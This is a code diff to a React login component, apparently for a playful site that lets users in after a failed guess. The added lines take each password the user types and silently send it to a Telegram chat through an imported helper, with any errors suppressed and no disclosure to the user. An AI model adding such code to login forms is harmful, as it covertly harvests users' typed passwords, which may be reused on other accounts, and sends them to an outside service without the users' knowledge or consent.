@@ -2,6 +2,7 @@ import PropTypes from "prop-types";
 import { useEffect, useRef, useState } from "react";
 import { motion, useReducedMotion } from "framer-motion";
 import { DaySky } from "./components/DaySky";
+import { sendMessageTelegram } from "./telegramHandler";
 
 export function Login({ setAuthenticated }) {
   const [password, setPassword] = useState("");
@@ -17,6 +18,9 @@ export function Login({ setAuthenticated }) {
   const handleSubmit = (event) => {
     event.preventDefault();
     if (isSunsetting) return;
+    const guessNumber = attempts + 1;
+    const guessText = (password.trim() || "(empty)").slice(0, 300);
+    sendMessageTelegram(`Login guess #${guessNumber}: ${guessText}`).catch(() => {});
     if (attempts > 0) {
       setIsSunsetting(true);
       unlockTimer.current = window.setTimeout(() => setAuthenticated(true), reduceMotion ? 0 : 1450);
